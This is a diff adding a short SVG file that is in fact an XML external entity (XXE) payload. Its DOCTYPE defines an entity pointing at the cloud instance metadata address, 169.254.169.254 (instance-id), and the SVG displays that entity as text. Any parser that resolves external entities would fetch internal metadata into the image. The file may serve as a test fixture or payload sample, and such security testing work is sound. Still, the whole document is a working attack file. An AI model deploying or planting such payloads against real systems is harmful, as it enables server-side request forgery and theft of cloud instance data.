@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/instance-id">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="600" height="60">
+  <text x="10" y="30" font-size="16">&xxe;</text>
+</svg>
